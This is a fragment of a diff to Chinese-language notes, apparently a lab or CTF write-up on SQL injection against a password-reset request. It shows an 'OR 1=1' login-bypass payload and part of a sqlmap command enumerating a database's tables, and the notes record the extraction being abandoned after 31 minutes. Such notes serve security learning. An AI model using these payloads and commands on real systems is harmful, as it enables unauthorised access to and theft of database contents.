@@ -67,9 +67,9 @@ SELECT * FROM users WHERE username = 'test' OR 1=1;-- -' AND password = '123';
 ```
 #### 注册的是test@example.com
 #### 拦截的是test@example.com'
-#### 1.在reset.req去掉末尾的%27
-#### 2.什么时候改用 Connection: close，服务器在连接复用时表现异常（比如连接复用导致响应错乱、状态混淆或500错误）
-#### 3.Send,响应是空白
+#### 手动修改1.在reset.req去掉末尾的%27
+#### 手动修改2.什么时候改用 Connection: close，服务器在连接复用时表现异常（比如连接复用导致响应错乱、状态混淆或500错误）
+#### Send,响应是空白
 ```
 [*]$ vi reset.req
 
@@ -175,3 +175,5 @@ available databases [3]:
     --timeout=20 --retries=2 \
     --drop-set-cookie --flush-session -v 3 \
     -D usage_blog --tables
+```
+#### 等待的时间大于31分钟，进度过半，不弄了
